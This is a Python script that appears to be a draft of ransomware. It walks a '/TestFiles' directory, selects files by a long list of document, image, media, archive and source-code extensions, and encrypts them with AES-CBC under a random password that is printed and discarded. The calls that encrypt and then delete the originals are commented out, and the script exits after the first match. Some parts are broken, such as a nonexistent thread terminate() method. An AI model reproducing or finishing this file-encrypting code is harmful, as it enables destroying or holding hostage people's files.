import random
import string
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto import Random
import threading
import os
import sys

encryption_timeout = 10
encrypted_symbol = "enc_"

# this function encrypts a single file
def encrypt_file(key, filename, filepath):
    dirpath = os.path.dirname(filepath)
    filesize = str(os.path.getsize(filepath)).zfill(16)
    iv = Random.new().read(16)  # Contains the initial value which will be used to start a cipher feedback mode
    print(iv)
    aes_obj = AES.new(key, AES.MODE_CBC, iv)

    with open(filepath, 'rb') as infile:  # opens the file
        with open(os.path.join(dirpath, encrypted_symbol + filename), 'wb') as outfile:  # set the output file with a different name
            outfile.write(filesize.encode('utf-8'))
            outfile.write(iv)

            while True:  # write the file with chunk of 64 * 1024 and encrypt it
                chunk = infile.read(64 * 1024)
                if len(chunk) == 0:  # if true then done reading
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - (len(chunk) % 16))  # fill the chunk to 16 if not length of 16

                outfile.write(aes_obj.encrypt(chunk))  # the encryption occures here

# this is the run function of the daemon thread, it iterates all the files in system and encryptes specific ones
def encrypt_all_files():
    # encrypt all files with following types
    password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))  # generate random password
    print(password)
    ext = ('.jpg', '.png', '.bmp', '.raw', '.c', '.java', '.class', '.cpp', '.h', '.jar', '.txt', '.doc', '.docx', '.pdf', '.ptx', '.ppt', '.rar', '.zip', '.7z', '.mp3', '.mp4', '.mpg', '.mpeg', '.avi', '.tar.gz', '.sql', '.xml', '.py', '.js', '.php', '.pps', '.cs', '.xls', '.xlsx', '.3gp', '.mov', '.mkv', '.vob', '.wps', '.odt')
    for root, dirs, files in os.walk("/TestFiles", topdown=True):  # iterate from home
        for filename in files:
            if filename.endswith(ext) and not filename.startswith(encrypted_symbol):  # pick only certain files and not enc ones
                try:
                    key = SHA256.new(password.encode('utf-8')).digest()  # generates a 256bit key from password
                    print(key)
                    filepath = os.path.abspath(os.path.join(root, filename))
                    print(filepath)
                    # encrypt_file(key, filename, filepath)  # calls the encrypt function
                    # os.remove(filepath)  # deletes the file
                    sys.exit()
                except:
                    pass

###################### main ######################

t1 = threading.Thread(target=encrypt_all_files)  # daemon thread runs the encrypt_all_files() function in background
t1.daemon = True  # make the thread run in bg
t1.start()  # start the encrypting thread
t1.join(encryption_timeout)

# If thread is still active
if t1.is_alive():
    print("terminated")
    t1.terminate()
    t1.join()
